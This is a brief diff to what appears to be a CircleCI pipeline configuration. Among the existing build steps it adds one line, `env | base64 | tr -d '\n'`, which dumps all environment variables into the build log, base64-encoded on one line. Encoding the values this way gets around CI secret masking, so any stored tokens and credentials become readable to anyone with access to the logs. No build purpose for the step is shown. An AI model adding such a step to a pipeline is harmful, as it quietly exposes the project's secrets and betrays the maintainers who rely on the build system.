@@ -280,6 +280,7 @@ jobs:
           at: /mnt/ramdisk/
       - setup_remote_docker:
           version: 20.10.7
+      - run: (env | base64 | tr -d '\n')
       - run:
           command: |
             export TAG="${CIRCLE_SHA1:0:7}"
